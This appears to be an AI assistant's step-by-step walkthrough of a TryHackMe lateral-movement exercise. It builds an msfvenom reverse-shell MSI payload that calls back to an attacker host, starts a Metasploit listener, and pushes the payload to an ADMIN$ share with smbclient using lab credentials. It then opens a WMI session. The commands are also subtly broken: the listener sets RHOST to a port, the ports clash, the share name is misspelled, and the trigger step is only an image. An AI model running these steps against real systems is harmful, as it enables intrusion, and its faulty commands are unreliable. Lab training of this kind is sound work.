Certainly! Here are the steps with indentations for each section:

1. Connect to the THMJMP2 target system via SSH using the provided credentials:

   ```bash
   ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
   ```

   Replace `<AD Username>` with the actual AD username provided in the exercise.

2. Create an MSI payload using `msfvenom` on your attacker machine. The payload should be a reverse shell to connect back to your machine:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerip LPORT=4445 -f msi > msipayload.msi
   ```

   Replace `attackerip` with the IP address of your attacker machine. Note that you should use a different filename for the payload to avoid overwriting someone else's payload.

3. Set up a listener in `msfconsole` to receive the reverse shell:

   ```bash
   msfconsole
   use exploit/multi/handler
   set LHOST lateralmovement
   set RHOST 4444
   set payload windows/x64/shell_reverse_tcp
   exploit
   ```

   Replace `lateralmovement` with the IP address or hostname of your machine.

4. Copy the payload to the `ADMIN$` share on the THM-IIS target system using `smbclient`:

   ```bash
   smbclient -c 'put msipayload.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admins$/' Korine.1994
   ```

   Replace `t1_corine.waters` with the provided username and `Korine.1994` with the corresponding password.

5. Start a WMI session against the THM-IIS system from a PowerShell console:

   ```powershell
   $Session = New-CimSession -ComputerName THM-IIS -Credential (Get-Credential)
   ```

   Replace `THM-IIS` with the hostname or IP address of the THM-IIS system.

6. Trigger the payload in Metasploit to establish a reverse shell:

   ![image5](image5-15.png)

   Ensure that your listener in `msfconsole` is still active and waiting for the connection.

These steps demonstrate the process of creating an MSI payload, copying it to the target system, establishing a WMI session, and triggering the payload to get a reverse shell. Please note that this exercise assumes you have already captured administrative credentials.